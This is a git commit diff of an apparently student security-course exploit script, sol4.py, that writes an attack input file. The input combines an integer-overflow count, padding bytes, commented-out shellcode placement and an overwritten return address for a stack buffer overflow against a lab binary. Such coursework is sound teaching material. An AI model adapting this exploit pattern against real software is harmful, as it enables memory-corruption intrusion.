93eda93bee4cd1779539c38dee09c96a0cf6106a
hirochri <hirochri@umich.edu>
2017-03-24 15:41:04 -0400

    progress

--- project4/sol4.py
+++ project4/sol4.py
@@ -3,14 +3,13 @@
 from struct import pack
 from shellcode import shellcode
 
-count = 3
-ints = [4294967295, 4294967295, 4294967295]
-
-out = ""
-out += pack("<I", count)
-for i in ints:
-    out += pack("<I", i)
-
+count = 1073741838
 f = open("tmp", "wb")
-f.write(out)
+#buf_ret_addr = pack("<I", 0
+#f.write(pack("<I", count) + "A"*53 + "B"*7)
+#f.write(pack("<I", count) + shellcode + "B"*7 + "B"*44 + pack("<I", 0xbffefa30))
+#lets just fill buffer for now
+addr = pack("<I", 0xbffefa30)
+f.write(pack("<I", count) + "A"*53 + "B"*3 + "C"*4 + addr)
+#f.write(out)
 f.close()
